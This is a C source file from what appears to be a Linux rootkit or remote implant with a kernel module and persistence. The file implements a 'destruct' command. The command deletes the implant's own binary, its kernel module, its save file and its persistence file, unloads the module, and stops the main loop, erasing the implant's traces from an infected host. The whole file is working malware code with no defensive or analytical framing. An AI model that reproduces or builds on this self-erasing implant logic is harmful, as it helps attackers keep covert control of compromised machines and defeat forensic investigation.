#define _GNU_SOURCE

#include "../inc/cmds.h"
#include "../inc/kernel.h"
#include "../inc/save.h"
#include "../inc/util.h"

#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

/*

 * first it deletes itself, the kernel module, the save file and the persistence file
 * then it unloads the kernel module
 * lastly sets "should_quit" to break the main loop

*/

// see main.c
extern bool should_quit;

char *cmd_destruct(job_t *job) {
  char self[PATH_MAX+1];
  cmd_recv_all(job);

  // no need to delete anything in debug mod
  if (SHRK_DEBUG)
    goto end;

  // first lets remove ourself
  if (NULL == get_self(self)) {
    debug("failed to obtain self path");
    goto skip_self;
  }
   
  if(unlink(self) != 0){ 
    debug_err("failed to unlink the self");
    return strerror(errno);
  }

skip_self:
  // next, lets remove the kernel module
  if (unlink(SHRK_MODULE) != 0) {
    debug_err("failed to unlink the kernel module");
    return strerror(errno);
  }

  // after that, remove the save file
  save_remove();

  // next, lets remove the persistence file
  if (SHRK_PERSIS_FILE[0] != 0 && unlink(SHRK_PERSIS_FILE) != 0) {
    debug_err("failed to unlink the persistence file");
    return strerror(errno);
  }

  // lastly unload the kernel module
  if (!kernel_unload()) {
    debug("failed to unload the module");
    return strerror(errno);
  }

end:
  should_quit = true;
  return "success";
}
